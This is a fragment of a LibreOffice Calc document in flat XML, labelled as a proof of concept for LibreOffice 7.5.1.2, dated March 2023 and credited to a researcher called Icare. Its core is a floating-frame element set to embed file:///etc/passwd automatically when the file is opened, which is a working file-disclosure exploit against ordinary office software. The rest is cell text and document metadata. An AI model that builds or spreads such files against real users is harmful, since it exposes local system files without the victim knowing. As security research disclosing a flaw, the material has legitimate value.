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frame-display-scrollbar="true" draw:frame-display-borde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svg:width="9.999cm" svg:height="9.999cm" svg:x="0cm" svg:y="6.306cm">
            <draw:floating-frame xlink:href="file:///etc/passwd" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:frame-name="Icare"/>
          </draw:frame>
        </table:shapes>
        <table:table-column table:style-name="co1" table:default-cell-style-name="ce1"/>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>POC-LibreOffice 7 .5.1.2 </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>March 2023</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Icare</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://twitter.com/Icare1337" xlink:type="simple">Icare (@Icare1337) / Twitter</text:a>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ad External ressour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6T11:25:48.358000000</meta:creation-date>
    <dc:date>2023-03-26T11:26:42.328000000</dc:date>
    <meta:editing-duration>PT54S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="1" meta:cell-count="5" meta:object-count="1"/>
    <meta:generator>LibreOffice/7.5.1.2$Windows_X86_64 LibreOffice_project/fcbaee479e84c6cd81291587d2ee68cba099e129</meta:generator>
  </office:meta>
</office:document-meta>
</file>